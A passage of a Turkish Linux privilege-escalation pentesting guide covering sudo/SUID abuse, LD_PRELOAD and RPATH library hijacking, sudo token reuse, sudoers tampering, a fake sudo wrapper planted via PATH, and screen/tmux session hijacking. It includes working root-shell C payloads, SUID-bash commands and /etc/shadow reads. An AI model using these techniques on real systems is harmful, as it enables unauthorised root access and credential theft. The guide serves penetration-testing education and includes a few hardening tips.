POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, host'un dosya sistemine root düzeyinde erişimle doğrudan container içinde komut çalıştırabilirsiniz.

### Others

Eğer **`docker` grubunun içinde olduğunuz** için docker socket üzerinde yazma izinlerine sahipseniz, [**yetki yükseltmenin daha fazla yolu**](interesting-groups-linux-pe/index.html#docker-group) vardır. Eğer [**docker API bir portta dinliyorsa** onu da ele geçirebilirsiniz](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Docker'dan kaçmak veya onu yetki yükseltmek için kötüye kullanmanın daha fazla yollarını şu yerde inceleyin:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Eğer **`ctr`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **bunu kötüye kullanarak yetki yükseltme yapabilirsiniz**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Eğer **`runc`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **bunu kötüye kullanarak yetki yükseltme yapabilirsiniz**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli bir şekilde etkileşim kurmasını ve veri paylaşmasını sağlayan gelişmiş bir **inter-Process Communication (IPC) sistemi**dir. Modern Linux sistemi göz önünde bulundurularak tasarlanmış olup, farklı uygulama iletişim biçimleri için sağlam bir çerçeve sunar.

Sistem, süreçler arası veri alışverişini geliştiren temel IPC'yi destekleyerek, gelişmiş UNIX domain sockets'a benzer işlevsellik sağlar. Ayrıca olay veya sinyal yayınına yardımcı olarak sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemon'undan gelen gelen çağrı sinyali, bir music player'ın sessize alınmasını tetikleyebilir. Ek olarak, D-Bus uzaktan nesne sistemini destekleyerek uygulamalar arasında servis istekleri ve metod çağrılarını basitleştirir; bu da geleneksel olarak karmaşık olan süreçleri kolaylaştırır.

D-Bus, eşleşen politika kurallarının kümülatif etkisine göre mesaj izinlerini (metod çağrıları, sinyal yayımı vb.) yöneten bir **allow/deny modeli** üzerinde çalışır. Bu politikalar bus ile hangi etkileşimlere izin verileceğini belirtir ve bu izinlerin kötüye kullanılması yoluyla yetki yükseltmeye izin verebilir.

Buna örnek olarak `/etc/dbus-1/system.d/wpa_supplicant.conf` içindeki bir politika verilebilir; bu, root kullanıcısının `fi.w1.wpa_supplicant1`'i sahiplenme, ona mesaj gönderme ve ondan mesaj alma izinlerini detaylandırır.

Belirli bir kullanıcı veya grup belirtilmeyen politikalar evrensel olarak uygulanırken, "default" bağlam politikaları diğer özel politikaların kapsamına girmeyen herkese uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini enumerate etmeyi ve exploit etmeyi buradan öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağ üzerinde enumerate yapmak ve makinenin konumunu belirlemek her zaman ilginçtir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Açık portlar

Erişim sağlamadan önce etkileşime giremediğiniz makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sniff traffic yapıp yapamayacağınızı kontrol edin. Eğer yapabiliyorsanız, bazı credentials elde edebilirsiniz.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Genel Keşif

Kim olduğunuzu, hangi **privileges**'e sahip olduğunuzu, sistemde hangi **users** bulunduğunu, hangilerinin **login** yapabildiğini ve hangilerinin **root privileges**'e sahip olduğunu kontrol edin:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Büyük UID

Bazı Linux sürümleri **UID > INT_MAX** olan kullanıcıların ayrıcalık yükseltmesine izin veren bir hatadan etkilendi. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruplar

root ayrıcalıkları verebilecek herhangi bir grubun **üyesi** olup olmadığınızı kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Mümkünse panonun içinde ilginç bir şey olup olmadığını kontrol edin.
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Ortamın herhangi bir parolasını **biliyorsanız**, parolayı kullanarak **her kullanıcı olarak oturum açmayı deneyin**.

### Su Brute

Çok fazla gürültü yapmaktan rahatsız değilseniz ve bilgisayarda `su` ve `timeout` binaries mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) ile kullanıcıya brute-force uygulamayı deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile ayrıca kullanıcıları brute-force etmeye çalışır.

## Yazılabilir PATH istismarları

### $PATH

Eğer $PATH içindeki bir klasöre **yazabiliyorsanız**, ayrı bir kullanıcı (tercihen root) tarafından çalıştırılacak bir komutun adıyla writable klasörün içine **bir backdoor oluşturmak** suretiyle ayrıcalıkları yükseltebilirsiniz; bu komutun $PATH içinde writable klasörünüzden **önce yer alan bir klasörden yüklenmemesi** gerekir.

### SUDO and SUID

Bazı komutları sudo ile çalıştırmaya izin verilmiş olabilir veya bazı dosyaların suid biti olabilir. Bunu şu komutla kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosyaları okumanıza ve/veya yazmanıza veya hatta bir komut çalıştırmanıza izin verebilir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının başka bir kullanıcının ayrıcalıklarıyla parola bilmeden bazı komutları çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo`, `vim`'i `root` olarak çalıştırabiliyor; root dizinine bir `ssh` anahtarı ekleyerek veya `sh` çağırarak kolayca bir shell elde etmek mümkün.
```
sudo vim -c '!sh'
```
### SETENV

Bu direktif, kullanıcının bir şey çalıştırırken **environment variable** ayarlamasına izin verir:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **based on HTB machine Admirer**, root olarak script çalıştırılırken rastgele bir python library yüklemek için **PYTHONPATH hijacking**'e **vulnerable** idi:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep tarafından korundu → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Neden işe yarıyor: Etkileşimsiz shell'ler için, Bash `$BASH_ENV`'i değerlendirir ve hedef script'i çalıştırmadan önce o dosyayı source eder. Birçok sudo kuralı bir script'i veya bir shell wrapper'ını çalıştırmaya izin verir. Eğer `BASH_ENV` sudo tarafından korunduyorsa, dosyanız root ayrıcalıklarıyla source edilir.

- Gereksinimler:
- Çalıştırabileceğiniz bir sudo kuralı (herhangi bir hedefin `/bin/bash`'i etkileşimsiz olarak çağırması veya herhangi bir bash script).
- `BASH_ENV`'in `env_keep` içinde olması (kontrol için `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Sertleştirme:
- `BASH_ENV` (ve `ENV`) öğelerini `env_keep`'ten kaldırın, `env_reset`'i tercih edin.
- sudo ile izin verilmiş komutlar için shell wrapper'lardan kaçının; mümkün olduğunca minimal binary'ler kullanın.
- Korunan env vars kullanıldığında sudo I/O logging ve alerting'i düşünün.

### Sudo yürütme atlatma yolları

**Jump** ile diğer dosyaları okumak veya **symlinks** kullanmak mümkündür. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılıyorsa (\*), bu daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo komutu/SUID binary komut yolu belirtilmeden

Eğer **sudo izni** tek bir komuta **komut yolu belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bunu istismar edebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** binary **başka bir komutu yolunu belirtmeden çalıştırıyorsa (her zaman garip bir SUID binary'nin içeriğini _**strings**_ ile kontrol edin)** durumunda da kullanılabilir.

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu belirtilmiş SUID binary

Eğer **suid** binary **başka bir komutu yol belirterek çalıştırıyorsa**, o zaman suid dosyasının çağırdığı komut adıyla bir **export a function** oluşturmaya çalışabilirsiniz.

Örneğin, eğer bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, fonksiyonu oluşturup export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Daha sonra, suid binary'yi çağırdığınızda bu işlev çalıştırılacaktır

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

Ancak, özellikle **suid/sgid** yürütülebilirlerle bu özelliğin kötüye kullanılmasını önlemek ve sistem güvenliğini sağlamak için sistem bazı koşullar uygular:

- Yükleyici, gerçek kullanıcı kimliği (_ruid_) ile etkili kullanıcı kimliği (_euid_) eşleşmeyen yürütülebilirler için **LD_PRELOAD**'ü dikkate almaz.
- suid/sgid olan yürütülebilirler için yalnızca standart yollardaki ve aynı zamanda suid/sgid olan kütüphaneler önceden yüklenir.

Yetki yükseltmesi, `sudo` ile komut çalıştırma yeteneğiniz varsa ve `sudo -l` çıktısında **env_keep+=LD_PRELOAD** ifadesi yer alıyorsa gerçekleşebilir. Bu yapılandırma, `sudo` ile komut çalıştırıldığında bile **LD_PRELOAD** ortam değişkeninin korunmasına ve tanınmasına izin verir; bu da potansiyel olarak yükseltilmiş ayrıcalıklarla rastgele kod çalıştırılmasına yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Şu isimle kaydedin: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Sonra **compile it** kullanarak:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırarak
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env değişkenini kontrol ediyorsa kötüye kullanılabilir çünkü kütüphanelerin aranacağı yolu kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Olağandışı görünen **SUID** izinlerine sahip bir binary ile karşılaştığınızda, **.so** dosyalarını doğru şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bunu aşağıdaki komutu çalıştırarak kontrol edebilirsiniz:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata, bunun istismar edilebileceğine işaret eder.

Bunu istismar etmek için, aşağıdaki kodu içeren, örneğin _"/path/to/.config/libcalc.c"_ adlı bir C dosyası oluşturulur:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlendikten ve çalıştırıldıktan sonra, dosya izinlerini manipüle ederek ve ayrıcalıklı bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını bir shared object (.so) dosyasına şu şekilde derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'nin çalıştırılması exploit'i tetiklemeli ve potansiyel sistem ele geçirilmesine izin vermelidir.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Artık yazabildiğimiz bir klasörden library yükleyen bir SUID binary bulduğumuza göre, gerekli isimle library'yi o klasöre oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Aşağıdaki gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyon içermesi gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) yerel güvenlik kısıtlamalarını aşmak için bir saldırgan tarafından istismar edilebilecek Unix ikili dosyalarının seçkin bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise bir komutta **yalnızca argüman enjekte edebildiğiniz** durumlar için aynıdır.

Proje, kısıtlı shell'lerden çıkmak, ayrıcalıkları yükseltmek veya sürdürmek, dosya transferi yapmak, bind ve reverse shell oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilecek Unix ikili dosyalarının meşru işlevlerini toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l` komutuna erişiminiz varsa, herhangi bir sudo kuralını nasıl istismar edeceğini bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Sudo Token'larını Yeniden Kullanma

Parolayı bilmediğiniz ancak **sudo access**'iniz olduğu durumlarda, bir sudo komutunun çalıştırılmasını bekleyip ardından oturum token'ını kaçırarak ayrıcalıkları yükseltebilirsiniz.

Ayrıcalıkları yükseltmek için gereksinimler:

- Zaten "_sampleuser_" kullanıcısı olarak bir shell'e sahipsiniz
- "_sampleuser_" **son 15 dakikada** bir şeyleri çalıştırmak için **`sudo` kullanmış olmalı** (varsayılan olarak bu, herhangi bir parola girmeden `sudo` kullanmamıza izin veren sudo token'ının süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 olmalı
- `gdb` erişilebilir olmalı (yükleyebilmelisiniz)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` olarak ayarlayabilirsiniz)

Eğer tüm bu gereksinimler sağlanıyorsa, **şu aracı kullanarak ayrıcalıkları yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- İlk **exploit** (`exploit.sh`) _/tmp_ içinde `activate_sudo_token` ikili dosyasını oluşturacaktır. Bunu oturumunuzdaki sudo token'ını **aktif etmek** için kullanabilirsiniz (otomatik olarak root shell elde etmeyeceksiniz, `sudo su` yapın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- İkinci **exploit** (`exploit_v2.sh`) _/tmp_ içinde **root tarafından sahip olunan ve setuid olan** bir sh shell oluşturacak
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Bu **üçüncü exploit** (`exploit_v3.sh`) **sudoers file oluşturacak**; bu **sudo tokens**'ı sonsuza dek geçerli kılar ve tüm kullanıcıların **sudo** kullanmasına izin verir
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Klasörde veya klasör içinde oluşturulan dosyalardan herhangi birinde **write permissions**'a sahipseniz binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) kullanarak bir kullanıcı ve PID için **sudo token** oluşturabilirsiniz.\
Örneğin, eğer _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabiliyorsanız ve PID'si 1234 olan o kullanıcı olarak bir shell'e sahipseniz, parola bilmeye gerek kalmadan **sudo privileges** elde edebilirsiniz:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar kimin `sudo` kullanabileceğini ve nasıl kullanacağını yapılandırır. Bu dosyalar **varsayılan olarak yalnızca user root ve group root tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı ilginç bilgilere **ulaşabilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** **escalate privileges** elde edebilirsiniz.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazabiliyorsanız bu izni kötüye kullanabilirsiniz
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın başka bir yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` binary'sine alternatif olarak OpenBSD için `doas` gibi seçenekler vardır; yapılandırmasını `/etc/doas.conf`'ta kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcının genellikle bir makineye bağlanıp ayrıcalık yükseltmek için `sudo` kullandığını** biliyorsanız ve o kullanıcı bağlamında bir shell elde ettiyseniz, **yeni bir sudo executable oluşturabilirsiniz**; bu executable kodunuzu root olarak çalıştıracak ve ardından kullanıcının komutunu yürütecektir. Sonra, kullanıcı bağlamının **$PATH**'ini (örneğin yeni yolu `.bash_profile` içine ekleyerek) değiştirin, böylece kullanıcı `sudo` çalıştırdığında sizin sudo executable'ınız çalıştırılır.

Dikkat: eğer kullanıcı farklı bir shell (bash olmayan) kullanıyorsa, yeni yolu eklemek için diğer dosyaları değiştirmeniz gerekir. Örneğin[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Veya şu şekilde bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

Dosya `/etc/ld.so.conf` **yüklenen yapılandırma dosyalarının nereden geldiğini gösterir**. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları **kütüphanelerin aranacağı diğer klasörleri işaret eder**. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'tir. **Bu, sistemin `/usr/local/lib` içinde kütüphaneleri arayacağı anlamına gelir**.

Eğer herhangi bir sebepten ötürü bir kullanıcı `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasının işaret ettiği herhangi bir klasörde **yazma iznine sahipse**, he may be able to escalate privileges.\
Aşağıdaki sayfada bu yanlış yapılandırmanın **nasıl istismar edileceğini** inceleyin:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` dizinine kopyalayarak, program tarafından burada, `RPATH` değişkeninde belirtildiği şekilde kullanılacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Daha sonra `/var/tmp` içinde `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` komutuyla kötü amaçlı bir kütüphane oluşturun.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux capabilities bir sürece mevcut **root privileges'ın bir altkümesini** sağlar. Bu, root **privileges'ı daha küçük ve ayrı birimlere** ayırmış olur. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Bu şekilde tüm ayrıcalık seti azalır ve exploitation riskleri düşer.\
Aşağıdaki sayfayı okuyun ve **capabilities ve bunların nasıl kötüye kullanılacağını öğrenin**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **"execute" biti** etkilenen kullanıcının **"cd"** ile klasöre girebileceği anlamına gelir.\
**"read"** biti, kullanıcının **list** ile **files**'ları görebileceğini; ve **"write"** biti, kullanıcının yeni **files** oluşturma ve **delete** etme yetkisine sahip olduğunu gösterir.

## ACLs

Access Control Lists (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve geleneksel **ugo/rwx permissions**'ı **geçersiz kılabilme** yeteneğine sahiptir. Bu izinler, sahip olmayan veya grubun bir parçası olmayan belirli kullanıcılara haklar verip reddederek dosya veya dizin erişimi üzerinde kontrolü artırır. Bu düzeydeki **granülerlik**, daha hassas erişim yönetimini sağlar. Daha fazla ayrıntı için [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) adresine bakın.

**Verin** kullanıcı "kali"ya bir dosya üzerinde read ve write izinleri:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Al** sistemden belirli ACL'lere sahip dosyaları:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell oturumları

**Eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**En yeni sürümlerde** sadece **kendi kullanıcı hesabınız**ın **screen** oturumlarına **bağlanabileceksiniz**. Ancak oturumun içinde **ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**screen oturumlarını listele**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Oturuma bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümleri** ile ilgili bir sorundu. root tarafından oluşturulmuş bir tmux (v2.1) oturumunu ayrıcalıksız bir kullanıcı olarak ele geçiremedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Session'a bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
**Valentine box from HTB** örneğine bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Eylül 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) oluşturulan tüm SSL ve SSH anahtarları bu hatadan etkilenmiş olabilir.\
Bu hata, söz konusu OS'lerde yeni bir ssh anahtarı oluşturulduğunda ortaya çıkar; çünkü **sadece 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olduğunuzda karşılık gelen private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları burada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Parola ile doğrulamanın izin verilip verilmediğini belirtir. Varsayılan `no`'dur.
- **PubkeyAuthentication:** Public key ile doğrulamanın izin verilip verilmediğini belirtir. Varsayılan `yes`'dir.
- **PermitEmptyPasswords**: Parola ile doğrulama izinliyse, sunucunun boş parola dizisine sahip hesaplarla girişe izin verip vermediğini belirtir. Varsayılan `no`'dur.

### PermitRootLogin

root kullanıcısının ssh ile giriş yapıp yapamayacağını belirtir, varsayılan `no`'dur. Olası değerler:

- `yes`: root parola ve private key ile giriş yapabilir
- `without-password` veya `prohibit-password`: root sadece private key ile giriş yapabilir
- `forced-commands-only`: root sadece private key ile ve komut seçenekleri belirtilmişse giriş yapabilir
- `no` : izin verilmez

### AuthorizedKeysFile

Kullanıcı doğrulaması için kullanılabilecek public key'leri içeren dosyaları belirtir. `%h` gibi home dizini ile değiştirilecek token'lar içerebilir. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
